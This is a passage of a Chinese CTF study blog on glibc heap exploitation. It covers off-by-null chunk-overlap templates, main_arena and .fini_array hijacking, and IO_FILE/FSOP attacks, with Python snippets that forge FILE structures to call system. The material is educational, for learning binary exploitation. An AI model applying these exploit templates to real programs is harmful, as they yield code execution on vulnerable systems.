class="token punctuation">)</span><span class="token comment" spellcheck="true">#4从unsortedbin切割</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#chunk3根据prevsize找到chunk1，chunk1为free状态，触发合并，于是chunk4处于复用状态</span></code></pre><p>以上是2.23的利用方法，如果是2.27的版本则需要将tcache填满</p><p>注意，可能需要<strong>伪造chunk</strong>来绕过检查</p><p>2.普通的off-by-null</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2 off-by-null chunk3,chunk3的size的isuse位被置0，prevsize被设置为chunk1+chunk2</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#chunk3被free，根据prevsize找到chunk1，chunk1被free，触发合并，chunk2处于复用状态</span></code></pre><p>3.以上两种方法只适用于2.23及2.27，2.29及以上版本增加了检查，直接修改size和prvesize不再适用，需要借用largebin的残留指针来操作。</p><p>借用一张图</p><p><a href="https://imgchr.com/i/slP3j0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/10/slP3j0.png" alt="slP3j0.png"></a></p><p>构造模板如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#用于填充tcache</span>add<span class="token punctuation">(</span><span class="token number">0x5a8</span><span class="token punctuation">,</span><span class="token string">'pad'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#使堆地址对齐</span>add<span class="token punctuation">(</span><span class="token number">0x5e0</span><span class="token punctuation">,</span><span class="token string">'chunk_72'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#largebin</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'chunk_73'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#防止largebin被topchunk合并</span>delete<span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#dele掉0x5e0的chunk，进入unsortedbin</span>add<span class="token punctuation">(</span><span class="token number">0x618</span><span class="token punctuation">,</span><span class="token string">'chunk_72'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#申请一个大于0x5e0的chunk，使其进入largebin，堆上留下了残留指针</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk0 从largebin切割，在其中伪造一个0xe1的chunk，将fakechunk的fd指向chunk3</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_75'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk1</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_76'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk2</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_77'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk3</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_78'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#chunk4 剩下0x500的unsortedbin</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">+</span>i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将tcache填满</span>delete<span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#free chunk1 进入fastbin</span>delete<span class="token punctuation">(</span><span class="token number">77</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#free chunk3 ，使chunk3的fd指针上留下堆指针</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将tcache清空</span>add<span class="token punctuation">(</span><span class="token number">0x618</span><span class="token punctuation">,</span><span class="token string">'chunk_75'</span> <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将unsortedbin放入largebin</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#使chunk3的bk指针指向chunk0</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_1'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#将tcache填满</span>    delete<span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">+</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">78</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#free chunk4</span>delete<span class="token punctuation">(</span><span class="token number">74</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#free chunk0 使chunk0的fd上留下堆指针</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'chunk_'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将tcache清空</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span>p8<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将chunk0的fd指针指向fakechunk</span>add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#伪造chunk5的presize为fakechunk的size，并off-by-null，置chunk5的inuse位为0</span>add<span class="token punctuation">(</span><span class="token number">0x4f8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将chunk5申请回来</span>delete<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将chunk5 free，触发合并</span></code></pre><p>由于我们需要堆地址为<code>0x????????????0???</code>，即倒数第四位为0，所以概率为1/16</p><p>构造完成后就是下面的情况</p><p><a href="https://imgchr.com/i/slFBm6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/10/slFBm6.png" alt="slFBm6.png"></a></p><h2 id="0x10-main-arena打击"><a href="#0x10-main-arena打击" class="headerlink" title="0x10.main_arena打击"></a>0x10.main_arena打击</h2><p>堆题目中可以尝试劫持main_arena</p><p>分情况，如果能分配0x68的chunk的话，就可以直接往main_arena上错位分配，找个0x7f地址开头的，就可以申请过去了，接着修改main_arena+88处的值，这里是存放topchunk地址的位置，我们可以将其修改为malloc_hook上方一点的位置，接着继续申请chunk就能分配到malloc_hook了；如果要劫持free_hook的话要麻烦些，需要把main_arena劫持到free_hook上方一段距离，然后一直申请chunk才能分配到free_hook；如果分配不了0x68的chunk，但可以分配0x40的chunk，可以伪造一个大一点的chunk，如0x70的，再将其free掉，然后在main_arena中就会记录下这个0x70的chunk的地址，堆地址开头可能为0x55或者0x56，如果为0x56的话，我们再进行错位申请就可以申请到main_arena去，接着修改main_arena+88的值即可。</p><h2 id="0x11-fini-array劫持"><a href="#0x11-fini-array劫持" class="headerlink" title="0x11. .fini_array劫持"></a>0x11. .fini_array劫持</h2><p>Linux下c程序的运行顺序如下</p><pre><code>_start---&gt;__libc_start_main_---&gt;init---&gt;main---&gt;fini</code></pre><p><a href="https://imgchr.com/i/ypVBxU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/28/ypVBxU.png" alt="ypVBxU.png"></a></p><p>init会执行.init_array数组内的函数，fini会执行.fini_array数组内的函数，在IDA内按ctrl+s可以看到这两个数组的地址</p><p><a href="https://imgchr.com/i/ypZySf" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/28/ypZySf.png" alt="ypZySf.png"></a></p><p>程序运行流程更加细化如下所示</p><pre><code>_start---&gt;__libc_start_main---&gt;init---&gt;.init_array[0]---&gt;.init_array[1]---&gt;...---&gt;.init_array[n]---&gt;main---&gt;fini---&gt;.fini_array[n]---&gt;.fini_array[n-1]---&gt;...---&gt;.fini_array[0]</code></pre><p>.init_array内的函数顺序执行，.fini_array内的函数逆序执行</p><p>将.fini_array[1]修改为main函数的地址，将.fini_array[0]修改为fini函数的地址，就可以无限循环了，流程如下</p><pre><code>_start---&gt;__libc_start_main---&gt;init---&gt;.init_array[0]---&gt;.init_array[1]---&gt;main---&gt;fini---&gt;.fini_array[1](main)---&gt;.fini_array[0](fini)</code></pre><h2 id="0x12-IO-FILE结构体攻击"><a href="#0x12-IO-FILE结构体攻击" class="headerlink" title="0x12.IO_FILE结构体攻击"></a>0x12.IO_FILE结构体攻击</h2><p>接上面的house of orange</p><p>FILE结构体中有几个重要的指针</p><pre><code>_IO_buf_base：输入输出缓冲区基地址_IO_buf_end：输入输出缓冲区结束地址_IO_write_base：输出缓冲区基地址_IO_write_ptr：输出缓冲区已使用的地址_IO_write_end：输出缓冲区结束地址_IO_read_ptr：输入缓冲区的起始地址_IO_read_end:输入缓冲区的结束地址</code></pre><p>引用raycp大佬的解释</p><blockquote><p>其中<code>_IO_buf_base</code>和<code>_IO_buf_end</code>是缓冲区建立函数<code>_IO_doallocbuf</code>（上一篇详细描述过）会在里面建立输入输出缓冲区，并把基地址保存在<code>_IO_buf_base</code>中，结束地址保存在<code>_IO_buf_end</code>中。在建立里输入输出缓冲区后，如果缓冲区作为输出缓冲区使用，会将基址址给<code>_IO_write_base</code>，结束地址给<code>_IO_write_end</code>，同时<code>_IO_write_ptr</code>表示为已经使用的地址。即<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的空间是已经使用的缓冲区，<code>_IO_write_ptr</code>到<code>_IO_write_end</code>之间为剩余的输出缓冲区。</p></blockquote><p>还需要介绍几个函数(以下引用ctfwiki上的介绍)</p><h3 id="1-fread"><a href="#1-fread" class="headerlink" title="1.fread"></a>1.fread</h3><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下</p><pre class=" language-c"><code class="language-c">size_t <span class="token function">fread</span> <span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> size_t count<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span> <span class="token punctuation">;</span></code></pre><p>fread 的代码位于 /libio/iofread.c 中，函数名为<code>_IO_fread</code>，但真正的功能实现在子函数<code>_IO_sgetn</code> 中。</p><pre class=" language-c"><code class="language-c">_IO_size_t<span class="token function">_IO_fread</span> <span class="token punctuation">(</span>buf<span class="token punctuation">,</span> size<span class="token punctuation">,</span> count<span class="token punctuation">,</span> fp<span class="token punctuation">)</span>     <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span>     _IO_size_t size<span class="token punctuation">;</span>     _IO_size_t count<span class="token punctuation">;</span>     _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token punctuation">{</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  bytes_read <span class="token operator">=</span> <span class="token function">_IO_sgetn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">,</span> bytes_requested<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p>在<code>_IO_sgetn</code> 函数中会调用<code>_IO_XSGETN</code>，而<code>_IO_XSGETN</code> 是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p><pre class=" language-c"><code class="language-c">_IO_size_t<span class="token function">_IO_sgetn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> n<span class="token punctuation">)</span>     _IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>     <span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>     _IO_size_t n<span class="token punctuation">;</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">_IO_XSGETN</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的，</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base          <span class="token operator">&amp;&amp;</span> want <span class="token operator">&lt;</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__underflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><p><code>__underflow</code>会调用<code>_IO_UNDERFLOW</code>，<code>_IO_UNDERFLOW</code>又会调用<code>_IO_new_file_underflow</code>，<code>_IO_new_file_underflow</code>最终会调用<code>_IO_SYSREAD</code>函数来执行read系统调用</p><pre class=" language-c"><code class="language-c">count <span class="token operator">=</span> <span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span>           fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>调用<code>_IO_SYSREAD</code>（vtable中的<code>_IO_file_read</code>函数），该函数最终执行系统调用read，读取文件数据，数据读入到<code>fp-&gt;_IO_buf_base</code>中，读入大小为输入缓冲区的大小<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code>。</p><p>设置输入缓冲区已有数据的size，即设置<code>fp-&gt;_IO_read_end</code>为<code>fp-&gt;_IO_read_end += count</code>。</p><h3 id="2-fwrite"><a href="#2-fwrite" class="headerlink" title="2.fwrite"></a>2.fwrite</h3><p>fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下</p><pre class=" language-c"><code class="language-c">size_t <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span><span class="token operator">*</span> buffer<span class="token punctuation">,</span> size_t size<span class="token punctuation">,</span> size_t count<span class="token punctuation">,</span> FILE<span class="token operator">*</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为<code>_IO_fwrite</code>。 在<code>_IO_fwrite</code> 中主要是调用<code>_IO_XSPUTN</code> 来实现写入的功能。</p><p>根据前面对<code>_IO_FILE_plus</code> 的介绍，可知<code>_IO_XSPUTN</code> 位于<code>_IO_FILE_plus</code> 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。</p><pre class=" language-c"><code class="language-c">written <span class="token operator">=</span> <span class="token function">_IO_sputn</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在<code>_IO_XSPUTN</code> 对应的默认函数<code>_IO_new_file_xsputn</code> 中会调用同样位于 vtable 中的<code>_IO_OVERFLOW</code></p><pre class=" language-c"><code class="language-c"> <span class="token comment" spellcheck="true">/* Next flush the (full) buffer. */</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span></code></pre><p><code>_IO_OVERFLOW</code> 默认对应的函数是<code>_IO_new_file_overflow</code></p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">,</span>             f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">==</span> f<span class="token operator">-></span>_IO_buf_end <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* Buffer is really full */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_flush</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span></code></pre><p>在<code>_IO_new_file_overflow</code> 内部最终会调用系统接口 write 函数</p><pre class=" language-c"><code class="language-c">count <span class="token operator">=</span> <span class="token function">_IO_SYSWRITE</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> data<span class="token punctuation">,</span> to_do<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>输出的内容为<code>f-&gt;_IO_write_ptr</code>到<code>f-&gt;_IO_write_base</code>之间的内容</p><h3 id="3-printf-puts"><a href="#3-printf-puts" class="headerlink" title="3.printf/puts"></a>3.printf/puts</h3><p>printf 和 puts 是常用的输出函数，在 printf 的参数是以’\n’结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。</p><p>puts 在源码中实现的函数是<code>_IO_puts</code>，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的<code>_IO_sputn</code>，结果会执行<code>_IO_new_file_xsputn</code>，最后会调用到系统接口 write 函数。</p><p>printf 的调用栈回溯如下，同样是通过<code>_IO_file_xsputn</code> 实现</p><pre><code>vfprintf+11_IO_file_xsputn_IO_file_overflowfunlockfile_IO_file_writewrite</code></pre><p>前置知识先说到这，后面讲到相关攻击手法时会继续说明</p><h3 id="4-FSOP-File-Stream-Oriented-Programming"><a href="#4-FSOP-File-Stream-Oriented-Programming" class="headerlink" title="4.FSOP(File Stream Oriented Programming)"></a>4.FSOP(File Stream Oriented Programming)</h3><p>根据对fread、fwrite、printf等IO函数源码的分析，可以知道这些函数最终都是调用了IO_FILE_plus中vtable内的函数</p><p>引用raycp大佬的总结</p><p><code>fopen</code>函数是在分配空间，建立FILE结构体，未调用vtable中的函数。</p><p><code>fread</code>函数中调用的vtable函数有：</p><ul><li><code>_IO_sgetn</code>函数调用了vtable的<code>_IO_file_xsgetn</code>。</li><li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。</li><li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable<code>__GI__IO_file_read</code>最终去执行系统调用read。</li></ul><p><code>fwrite</code> 函数调用的vtable函数有：</p><ul><li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li><li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li><li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li></ul><p><code>fclose</code>函数调用的vtable函数有：</p><ul><li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。</li><li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。</li><li><code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数。</li></ul><p>house of orange的利用关键就在于控制<code>_IO_list_all</code>，一般使用unsorted bin attack将<code>_IO_list_all</code>的值修改为main_arena+88，再将unsortedbin的size修改为0x60，并将其伪造为一个FILE结构体，且在适当偏移的位置处伪造好vtable，将vtable中<code>_IO_OVERFLOW</code>函数的位置修改为system，当我们申请chunk时会报错，unsortedbin会被放入0x60大小的smallbin链中，相对于main_arena+88的便宜为0x68，在FILE结构体中正好是chain的位置，于是<code>_IO_list_all</code>就顺着chain找到了我们伪造的FILE结构体和vtable。</p><p>令，如果程序只能分配0x50(最终分配0x60)的chunk，那么该怎么利用?可以将unsortedbin修改为0xb1大小，这样做的原因是：当<code>_IO_list_all</code>指向main_arena+88时，此时的chain为大小为0x60的smallbin那条链；当跳到0x60的smallbin那条链时，偏移0x68位置处(即chain的位置)又是大小为0xb0的smallbin的链，如下图所示</p><p><a href="https://imgchr.com/i/y9KY7D" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/28/y9KY7D.png" alt="y9KY7D.png"></a></p><p>我们可以通过两跳来利用house of orange</p><h3 id="5-绕过vtable-check"><a href="#5-绕过vtable-check" class="headerlink" title="5.绕过vtable check"></a>5.绕过vtable check</h3><p>glibc&gt;=2.24的环境下，对于vtable的地址增加了检查，限制其在<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code>之间</p><p>绕过方法就是使用libc内部的vtable<code>_IO_str_jumps</code>或<code>_IO_wstr_jumps</code></p><p><code>_IO_str_jumps</code>函数表如下</p><p><a href="https://imgchr.com/i/y9lDj1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/28/y9lDj1.png" alt="y9lDj1.png"></a></p><p>其中有两个函数可以利用：<code>_IO_str_overflow</code>和<code>_IO_str_finish</code></p><p><code>_IO_str_overflow</code>的利用条件总结如下</p><pre><code>_flags = 0_IO_write_ptr = 0x7fffffffffffffff_IO_write_base = 0_IO_buf_end = (binsh-100)/2_IO_buf_base = 0</code></pre><pre class=" language-python"><code class="language-python">fake_file <span class="token operator">=</span> IO_FILE_plus_struct<span class="token punctuation">(</span><span class="token punctuation">)</span>fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> <span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span>fake_file<span class="token punctuation">.</span>_IO_read_base<span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span>fake_file<span class="token punctuation">.</span>_IO_write_base<span class="token operator">=</span><span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">0x7fffffffffffffff</span>fake_file<span class="token punctuation">.</span>_IO_buf_base<span class="token operator">=</span><span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_buf_end<span class="token operator">=</span><span class="token punctuation">(</span>binsh<span class="token number">-100</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span>fake_file<span class="token punctuation">.</span>_mode<span class="token operator">=</span><span class="token number">0</span>fake_file<span class="token punctuation">.</span>vtable<span class="token operator">=</span>_IO_str_jumpspay<span class="token operator">+=</span>str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></code></pre><p><code>_IO_str_finish</code>的利用条件总结如下</p><pre><code>fp-&gt;_flags&amp;1==0fp-&gt;_mode &lt;= 0 fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_basefp-&gt;_IO_buf_base=binshfp-&gt;vtable=_IO_str_jumps-8fp+0xe8=system</code></pre><pre class=" language-python"><code class="language-python">fake_file <span class="token operator">=</span> IO_FILE_plus_struct<span class="token punctuation">(</span><span class="token punctuation">)</span>fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> <span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span>fake_file<span class="token punctuation">.</span>_IO_read_base <span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span>fake_file<span class="token punctuation">.</span>_IO_buf_base <span class="token operator">=</span> binshfake_file<span class="token punctuation">.</span>_mode <span class="token operator">=</span> <span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_write_base <span class="token operator">=</span> <span class="token number">0</span>fake_file<span class="token punctuation">.</span>_IO_write_ptr <span class="token operator">=</span> <span class="token number">1</span>fake_file<span class="token punctuation">.</span>vtable <span class="token operator">=</span> _IO_str_jumps<span class="token number">-8</span>pay<span class="token operator">+=</span>str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></code></pre><h3 id="6-IO-FILE-之任意读写"><a href="#6-IO-FILE-之任意读写" class="headerlink" title="6.IO FILE 之任意读写"></a>6.IO FILE 之任意读写</h3><h4 id="1-stdin标准输入缓冲区进行任意地址写"><a href="#1-stdin标准输入缓冲区进行任意地址写" class="headerlink" 